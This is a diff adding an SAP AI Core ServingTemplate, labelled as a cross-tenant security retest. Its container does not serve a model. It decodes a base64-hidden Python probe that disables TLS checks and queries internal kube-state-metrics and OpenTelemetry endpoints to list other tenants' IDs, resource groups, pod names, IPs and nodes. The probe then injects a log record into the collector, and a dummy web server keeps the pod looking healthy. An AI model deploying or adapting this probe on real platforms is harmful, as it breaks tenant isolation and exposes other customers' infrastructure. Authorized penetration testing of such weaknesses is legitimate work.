@@ -1,0 +1,39 @@
+apiVersion: ai.sap.com/v1alpha1
+kind: ServingTemplate
+metadata:
+  name: rce-retest-xt-nov
+  labels:
+    scenarios.ai.sap.com/id: "rce-retest-xt-2026-11"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "rce-retest-xt-2026-11"
+    executables.ai.sap.com/name: "rce-retest-xt-nov"
+    executables.ai.sap.com/description: "PSINC0011136 retest phase2 cross-tenant probe 2026-11-02"
+spec:
+  template:
+    apiVersion: "serving.kserve.io/v1beta1"
+    metadata:
+      annotations: |
+        autoscaling.knative.dev/target: 1
+      labels: |
+        ai.sap.com/resourcePlan: starter
+    spec: |
+      predictor:
+        minReplicas: 1
+        maxReplicas: 1
+        containers:
+        - name: kserve-container
+          image: python:3.11
+          command: ["/bin/sh", "-c"]
+          args:
+          - |
+            echo CmltcG9ydCBvcywgcmUsIGpzb24sIHNzbCwgc29ja2V0LCB1cmxsaWIucmVxdWVzdCwgdXJsbGliLmVycm9yCgpkZWYgcmVwb3J0KGssIHYpOgogICAgcHJpbnQoZiJbWFRdIHtrfToge3N0cih2KVs6MzAwMF19IiwgZmx1c2g9VHJ1ZSkKCmRlZiBodHRwKG1ldGhvZCwgdXJsLCB0aW1lb3V0PTI1LCBkYXRhPU5vbmUsIGhlYWRlcnM9Tm9uZSk6CiAgICBjdHggPSBzc2wuY3JlYXRlX2RlZmF1bHRfY29udGV4dCgpCiAgICBjdHguY2hlY2tfaG9zdG5hbWUgPSBGYWxzZQogICAgY3R4LnZlcmlmeV9tb2RlID0gc3NsLkNFUlRfTk9ORQogICAgdHJ5OgogICAgICAgIHJlcSA9IHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodXJsLCBkYXRhPWRhdGEsIG1ldGhvZD1tZXRob2QpCiAgICAgICAgZm9yIGgsIHYgaW4gKGhlYWRlcnMgb3Ige30pLml0ZW1zKCk6CiAgICAgICAgICAgIHJlcS5hZGRfaGVhZGVyKGgsIHYpCiAgICAgICAgciA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLCB0aW1lb3V0PXRpbWVvdXQsIGNvbnRleHQ9Y3R4KQogICAgICAgIHJldHVybiByLnJlYWQoKSwgci5zdGF0dXMKICAgIGV4Y2VwdCB1cmxsaWIuZXJyb3IuSFRUUEVycm9yIGFzIGU6CiAgICAgICAgcmV0dXJuIChlLnJlYWQoKSBvciBiIiIpWzoyMDBdLCBlLmNvZGUKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gZiJFUlI6e3R5cGUoZSkuX19uYW1lX199OntlfSIuZW5jb2RlKCksIDAKCnJlcG9ydCgiUE9EIiwgc29ja2V0LmdldGhvc3RieW5hbWUoc29ja2V0LmdldGhvc3RuYW1lKCkpKQpyZXBvcnQoIks4U19BUElfSE9TVCIsIG9zLmVudmlyb24uZ2V0KCJLVUJFUk5FVEVTX1NFUlZJQ0VfSE9TVCIsICJub25lIikpCgojIFtBXSBLU00gbXVsdGkgLS0gdGVuYW50IG5hbWVzcGFjZSBsYWJlbHMKYiwgYyA9IGh0dHAoIkdFVCIsICJodHRwOi8va3NtLW11bHRpLWt1YmUtc3RhdGUtbWV0cmljcy5vcGVudGVsZW1ldHJ5LnN2Yy5jbHVzdGVyLmxvY2FsOjgwODAvbWV0cmljcyIpCnJlcG9ydCgiQV9LU01fTVVMVElfU1RBVFVTIiwgYykKaWYgYyA9PSAyMDA6CiAgICB0ID0gYi5kZWNvZGUoInV0Zi04IiwgZXJyb3JzPSJyZXBsYWNlIikKICAgIHRpZHMgPSBzb3J0ZWQoc2V0KHJlLmZpbmRhbGwocidsYWJlbF9haV9zYXBfY29tX3RlbmFudF9pZD0iKFteIl0rKSInLCB0KSkpCiAgICByZXBvcnQoIkFfVU5JUVVFX1RFTkFOVF9JRFNfQ09VTlQiLCBsZW4odGlkcykpCiAgICByZXBvcnQoIkFfU0FNUExFIiwgdGlkc1s6NV0pCgojIFtCXSBLU00gY3VzdG9tIC0tIFJlc291cmNlR3JvdXAgQ1JEcwpiLCBjID0gaHR0cCgiR0VUIiwgImh0dHA6Ly9rc20tY3VzdG9tLWt1YmUtc3RhdGUtbWV0cmljcy5vcGVudGVsZW1ldHJ5LnN2Yy5jbHVzdGVyLmxvY2FsOjgwODAvbWV0cmljcyIpCnJlcG9ydCgiQl9LU01fQ1VTVE9NX1NUQVRVUyIsIGMpCmlmIGMgPT0gMjAwOgogICAgdCA9IGIuZGVjb2RlKCJ1dGYtOCIsIGVycm9ycz0icmVwbGFjZSIpCiAgICByZyA9IFtsIGZvciBsIGluIHQuc3BsaXQoIlxuIikgaWYgImFpY29yZV9yZXNvdXJjZV9ncm91cF9pbmZvIiBpbiBsXQogICAgcmVwb3J0KCJCX1JHX0NSRF9DT1VOVCIsIGxlbihyZykpCiAgICByZXBvcnQoIkJfU0FNUExFIiwgcmdbOjJdKQoKIyBbQ10gT1RlbCBUQSAtLSBwb2QgdG9wb2xvZ3kKYiwgYyA9IGh0dHAoIkdFVCIsICJodHRwOi8vb3RlbC1zY3JhcGVyLXRhcmdldGFsbG9jYXRvci5vcGVudGVsZW1ldHJ5LnN2Yy5jbHVzdGVyLmxvY2FsOjgwL2pvYnMva3ViZXJuZXRlcy1wb2RzL3RhcmdldHMiKQpyZXBvcnQoIkNfVEFfUE9EU19TVEFUVVMiLCBjKQppZiBjID09IDIwMDoKICAgIGRhdGEgPSBqc29uLmxvYWRzKGIpCiAgICBwb2RzID0gW3RnLmdldCgibGFiZWxzIiwge30pCiAgICAgICAgICAgIGZvciBjZCBpbiBkYXRhLnZhbHVlcygpIGZvciB0ZyBpbiBjZC5nZXQoInRhcmdldHMiLCBbXSldCiAgICByZXBvcnQoIkNfVE9UQUxfUE9EUyIsIGxlbihwb2RzKSkKICAgIHJlcG9ydCgiQ19TQU1QTEUiLCBqc29uLmR1bXBzKFt7azogcC5nZXQoaykgZm9yIGsgaW4KICAgICAgICAoIl9fbWV0YV9rdWJlcm5ldGVzX25hbWVzcGFjZSIsICJfX21ldGFfa3ViZXJuZXRlc19wb2RfbmFtZSIsICJfX21ldGFfa3ViZXJuZXRlc19wb2RfaXAiKX0KICAgICAgICBmb3IgcCBpbiBwb2RzWzo1XV0pKQoKIyBbRF0gT1RlbCBUQSAtLSBub2RlIHRvcG9sb2d5CmIsIGMgPSBodHRwKCJHRVQiLCAiaHR0cDovL290ZWwtc2NyYXBlci10YXJnZXRhbGxvY2F0b3Iub3BlbnRlbGVtZXRyeS5zdmMuY2x1c3Rlci5sb2NhbDo4MC9qb2JzL2t1YmVybmV0ZXMtbm9kZXMvdGFyZ2V0cyIpCnJlcG9ydCgiRF9UQV9OT0RFU19TVEFUVVMiLCBjKQppZiBjID09IDIwMDoKICAgIGRhdGEgPSBqc29uLmxvYWRzKGIpCiAgICBub2RlcyA9IFt0Zy5nZXQoImxhYmVscyIsIHt9KQogICAgICAgICAgICAgZm9yIGNkIGluIGRhdGEudmFsdWVzKCkgZm9yIHRnIGluIGNkLmdldCgidGFyZ2V0cyIsIFtdKV0KICAgIHJlcG9ydCgiRF9UT1RBTF9OT0RFUyIsIGxlbihub2RlcykpCgojIFtFXSBPVExQIGxvZyBpbmplY3Rpb24gKHNpbmdsZSBiZW5pZ24gcmVjb3JkIHdpdGggdW5pcXVlIG1hcmtlcikKcGF5bG9hZCA9IGpzb24uZHVtcHMoeyJyZXNvdXJjZUxvZ3MiOiBbeyJyZXNvdXJjZSI6IHsiYXR0cmlidXRlcyI6IFsKICAgIHsia2V5IjogInNlcnZpY2UubmFtZSIsICJ2YWx1ZSI6IHsic3RyaW5nVmFsdWUiOiAicHNpbmMwMDExMTM2LXJldGVzdCJ9fV19LAogICAgInNjb3BlTG9ncyI6IFt7ImxvZ1JlY29yZHMiOiBbeyJib2R5IjogeyJzdHJpbmdWYWx1ZSI6CiAgICAiTUFSS0VSOnBzaW5jMDAxMTEzNi1yZXRlc3QtMjAyNi0xMS0wMiAoYXV0aG9yaXplZCByZXRlc3QgcHJvYmUgLS0gcGxlYXNlIGlnbm9yZSkifSwKICAgICJzZXZlcml0eVRleHQiOiAiSU5GTyJ9XX1dfV19KS5lbmNvZGUoKQpiLCBjID0gaHR0cCgiUE9TVCIsICJodHRwOi8vb3RlbC1jb2xsZWN0b3Iub3BlbnRlbGVtZXRyeS5zdmMuY2x1c3Rlci5sb2NhbDo0MzE4L3YxL2xvZ3MiLAogICAgICAgICAgICBkYXRhPXBheWxvYWQsIGhlYWRlcnM9eyJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiJ9KQpyZXBvcnQoIkVfT1RMUF9JTkpFQ1RfU1RBVFVTIiwgYykKcmVwb3J0KCJFX09UTFBfSU5KRUNUX0JPRFkiLCBiWzoxMjBdKQoKcmVwb3J0KCJET05FIiwgInBoYXNlMiBwcm9iZXMgY29tcGxldGUiKQo= | base64 -d > /tmp/probe.py
+            python3 /tmp/probe.py
+            python3 -c "
+            import http.server
+            class H(http.server.BaseHTTPRequestHandler):
+                def do_GET(self):
+                    self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
+                def log_message(self, *a): pass
+            http.server.HTTPServer(('', 8080), H).serve_forever()
+            "
